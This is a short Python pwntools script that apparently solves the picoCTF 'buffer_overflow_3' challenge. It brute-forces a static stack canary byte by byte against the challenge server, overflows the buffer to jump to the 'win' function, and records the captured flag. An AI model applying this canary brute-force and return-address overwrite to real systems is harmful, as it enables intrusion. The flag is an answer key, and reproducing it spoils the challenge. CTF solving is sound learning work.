from pwn import * 
from tqdm import tqdm
#context.log_level = 'debug'
context.log_level = 'error'
def getremote():
	#return process('./buffer_overflow_3')
	return remote('saturn.picoctf.net', 55761)
e = ELF('./buffer_overflow_3')
padding = b'a'*0x40
canary = b''
for _ in range(4):
	for b in tqdm(range(0, 255+1)):
		payload = padding+canary+bytes([b])
		r = getremote() 
		r.sendlineafter(b'Buffer?\n> ', str(len(payload)).encode())
		r.sendlineafter(b'Input> ', payload)
		res = r.recvline()
		r.close()
		if b'Smashing' not in res:
			canary += bytes([b])
			print(f'current canary = {canary.hex()}')
			break 
	if len(canary) <= _:
		print(f"didn't find new canary byte at index {_}")
		exit(1)
assert len(canary) == 4 
r = getremote()
payload = padding+canary+b'a'*(0x10-0x4+0x4)+p32(e.sym['win'])
r.sendlineafter(b'Buffer?\n> ', str(len(payload)).encode())
r.sendlineafter(b'Input> ', payload)
r.interactive()

# 42695264
# picoCTF{Stat1C_c4n4r13s_4R3_b4D_fba9d49b}

